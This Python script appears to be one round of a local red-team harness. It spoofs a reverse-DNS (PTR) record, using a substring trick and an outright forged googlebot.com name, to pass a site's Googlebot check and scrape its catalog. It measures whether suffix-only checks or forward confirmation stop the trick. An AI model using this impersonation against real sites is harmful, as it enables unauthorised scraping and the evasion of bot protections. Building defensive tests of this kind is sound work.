"""Round 2 attack: own the reverse zone, name your box after Googlebot.

Level 1 checks that the PTR of the source IP ends in `.googlebot.com`. The PTR of
192.0.2.77 is set by whoever controls 192.0.2.0/24's reverse zone, which is the
attacker's hosting provider, and every hosting panel lets a tenant set it to any
string. Two tries:

  a) a substring trick, for sloppy matchers:  crawl-1.googlebot.com.attacker-hosting.example
  b) an outright forgery:                    crawl-198-51-100-10.googlebot.com

Try (b) beats a suffix-only check. It cannot beat forward confirmation: Google's
zone resolves that name to 198.51.100.10, not to 192.0.2.77.

Expected: L1 -> 200/200 (forgery accepted). L2 -> 30/200 ("does not resolve back").

    python attacks/round2_ptr_spoof.py
"""

from __future__ import annotations

import httpx

from _common import ATTACKER_IP, BASE_URL, MOCK_URL, UA_GOOGLEBOT, headers, report, require_local_target, scrape_catalog

SUBSTRING_PTR = "crawl-1.googlebot.com.attacker-hosting.example"
FORGED_PTR = "crawl-198-51-100-10.googlebot.com"


def set_ptr(mock: httpx.Client, name: str) -> None:
    resp = mock.put("/hosting/ptr", json={"ip": ATTACKER_IP, "name": name})
    resp.raise_for_status()


def run(base: str = BASE_URL, mock_url: str = MOCK_URL) -> dict:
    require_local_target(base)
    require_local_target(mock_url)
    out = {}
    with httpx.Client(base_url=mock_url, timeout=10) as mock, httpx.Client(base_url=base, timeout=10) as c:
        c.post("/admin/reset", params={"scope": "budgets"})   # a fresh minute, same caches
        set_ptr(mock, SUBSTRING_PTR)
        c.post("/admin/reset", params={"scope": "budgets"})                       # fresh budget between tries
        out["substring"] = scrape_catalog(c, headers("bot-ptr-substring", ATTACKER_IP, UA_GOOGLEBOT))
        set_ptr(mock, FORGED_PTR)
        c.post("/admin/reset", params={"scope": "budgets", "cache": "rdns"})
        out["forged"] = scrape_catalog(c, headers("bot-ptr-forged", ATTACKER_IP, UA_GOOGLEBOT))
        mock.post("/reset")
    out["scraped"], out["total"] = out["forged"]["scraped"], out["forged"]["total"]
    return out


if __name__ == "__main__":
    print("=== Round 2: rewrite our own PTR, then claim Googlebot ===")
    out = run()
    report(f"PTR {SUBSTRING_PTR[:30]}…", out["substring"])
    report(f"PTR {FORGED_PTR}", out["forged"])
